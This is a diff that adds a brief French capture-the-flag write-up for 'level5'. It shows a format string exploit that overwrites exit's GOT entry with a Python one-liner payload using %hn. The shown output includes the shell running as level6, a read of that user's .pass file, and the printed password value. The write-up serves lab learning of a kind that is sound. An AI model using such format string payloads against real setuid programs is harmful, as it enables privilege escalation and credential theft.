@@ -1,0 +1,29 @@
+Meme chose que l'exo precedent, on override le got de la fonction exit:
+
+	$ objdump -d level5 | grep exit
+	80484f3:       e8 88 fe ff ff          call   8048380 <printf@plt>
+	80484f8:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
+	80484ff:       e8 cc fe ff ff          call   80483d0 <exit@plt>		; <----------
+	-----
+	080483d0 <exit@plt>:
+	80483d0:       ff 25 38 98 04 08       jmp    *0x8049838				; <----------
+	-----
+	$ gdb level5
+	(gdb) x 0x8049838
+	0x8049838 <exit@got.plt>:       0x080483d6								; <----------
+
+	$ /usr/bin/python -c 'print "AAAA" + "%4$p"' | ./level5
+	AAAA0x41414141
+
+target:		0x8049838
+write:		0x0804 84a4		# seulement la 2eme partie puisque la premiere est identique 
+134513828	2052 33956
+
+0x8049838 + 0 = 0x8049838	\x38\x98\x04\x08	33956 - 4 = 33952
+
+	$ /usr/bin/python -c 'print "\x38\x98\x04\x08" + "%33952x%4$hn"' > /tmp/exploit5
+	$ cat /tmp/exploit5 - | ./level5
+		$ whoami
+		level6
+		$ cat /home/user/level6/.pass
+		d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
